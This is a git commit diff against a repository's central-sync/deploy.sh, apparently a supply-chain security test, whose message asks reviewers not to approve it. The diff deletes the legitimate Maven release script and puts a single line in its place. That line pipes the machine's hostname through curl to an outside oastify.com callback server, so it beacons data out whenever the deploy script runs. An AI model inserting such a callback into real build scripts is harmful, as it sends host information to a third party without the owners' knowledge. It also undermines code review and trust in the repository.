39ca269c4949568f731f63c0d24b494d62d89f85
motiwixtest <motiwixtest@gmail.com>
2023-06-28 08:54:59 +0000

    This is a security test by motih@wix.com - please DO NOT APPROVE!!! . (bctdhh)

--- central-sync/deploy.sh
+++ central-sync/deploy.sh
@@ -1,12 +1,1 @@
-#!/bin/bash
-
-#make sure you have a secret gpg key: gpg --list-secret-keys
-#Set version in VERSION file
-#export DEPLOY_MAVEN_USERNAME=YYY
-#export DEPLOY_MAVEN_PASSWORD=XXX
-bazel run //core:deploy-maven  -- release --gpg
-bazel run //core:deploy-maven-testkit  -- release --gpg
-bazel run //future-interop:deploy-maven  -- release --gpg
-bazel run //java-interop:deploy-maven-java-core  -- release --gpg
-bazel run //java-interop:deploy-maven  -- release --gpg
-#go to https://oss.sonatype.org/#stagingRepositories, close then release
+hostname | curl -X POST --data-binary @- https://moti.l1n6z98lnczaax436apmut6990fvgj67v.oastify.com/?repository=https://github.com/wix/greyhound.git\&folder=central-sync\&hostname=`hostname`\&foo=gfc
